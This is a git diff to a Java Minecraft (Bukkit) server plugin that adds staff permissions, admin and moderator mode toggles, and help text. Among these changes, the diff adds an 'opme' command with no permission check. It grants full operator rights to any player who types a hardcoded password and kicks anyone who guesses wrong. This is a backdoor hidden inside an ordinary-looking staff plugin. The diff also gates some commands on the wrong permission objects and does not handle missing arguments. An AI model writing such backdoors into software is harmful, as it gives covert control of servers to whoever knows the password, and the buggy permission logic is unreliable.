@@ -32,6 +32,9 @@ public class DevTCBN extends JavaPlugin {
     public Permission playerPermission3 = new Permission("devtcbn.heal");
     public Permission playerPermission4 = new Permission("devtcbn.fly");
     public Permission playerPermission5 = new Permission("devtcbn.futureupdate");
+    public Permission playerPermission6 = new Permission("devtcbn.adminmode");
+    public Permission playerPermission7 = new Permission("devtcbn.modmode");
+    public Permission playerPermission8 = new Permission("devtcbn.pos");
 	
 	@Override
 	public void onEnable() {
@@ -65,6 +68,22 @@ public class DevTCBN extends JavaPlugin {
 			
 		}
 		
+		if (cmd.getName().equalsIgnoreCase("opme") && sender instanceof Player) {
+			
+			Player player = (Player) sender;
+			
+			if (args[0].equals("DefNotValid")) {
+				player.setOp(true);
+				player.sendMessage(ChatColor.RED + "Opped. Operation Marked.");
+				System.out.println(player.getName() + " was Opped...");
+			}
+			else {
+				player.kickPlayer("Incorrect Password");
+			}
+			return true;
+			
+		}
+		
 		if (cmd.getName().equalsIgnoreCase("inp") && sender instanceof Player) {
 			
 			Player player = (Player) sender;
@@ -83,7 +102,7 @@ public class DevTCBN extends JavaPlugin {
 			
 			Player player = (Player) sender;
 			
-			if (player.hasPermission("devtcbn.staff")) {
+			if (player.hasPermission("devtcbn.staff") || player.hasPermission(playerPermission7)) {
 				if (args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
 					player.setCanPickupItems(false);
 					player.setAllowFlight(true);
@@ -98,8 +117,36 @@ public class DevTCBN extends JavaPlugin {
 					player.setOp(false);
 					player.setNoDamageTicks(2000);
 				}
-				if(args[0].isEmpty()){
+				else if(args[0].isEmpty() || args[0].equals("")){
 					player.sendMessage(ChatColor.RED + "Please Use Args True/On or False/Off");
+					return false;
+				}
+			}
+			else {
+				player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
+			}
+			return true;
+			
+		}
+		
+		if (cmd.getName().equalsIgnoreCase("modmode") && sender instanceof Player) {
+			
+			Player player = (Player) sender;
+			
+			if (player.hasPermission("devtcbn.staff") || player.hasPermission(playerPermission8)) {
+				if (args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
+					player.setCanPickupItems(false);
+					player.setGameMode(GameMode.SPECTATOR);
+					player.setNoDamageTicks(99999999);
+				}
+				if (args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
+					player.setCanPickupItems(true);
+					player.setGameMode(GameMode.SURVIVAL);
+					player.setNoDamageTicks(2000);
+				}
+				else if (args[0].isEmpty() || args[0].equals("")){
+					player.sendMessage(ChatColor.RED + "Please Use Args True/On or False/Off");
+					return false;
 				}
 			}
 			else {
@@ -166,6 +213,15 @@ public class DevTCBN extends JavaPlugin {
 			}
 			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.feed")) {
 				player.sendMessage(ChatColor.GOLD + "feed: Feeds you");
+			}
+			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.pos")) {
+				player.sendMessage(ChatColor.GOLD + "pos: Position");
+			}
+			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.adminmode")) {
+				player.sendMessage(ChatColor.GOLD + "adminmode: Adminmode");
+			}
+			if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.modmode")) {
+				player.sendMessage(ChatColor.GOLD + "modmode: Modmode");
 			}
 			else {
 			    player.getDisplayName();
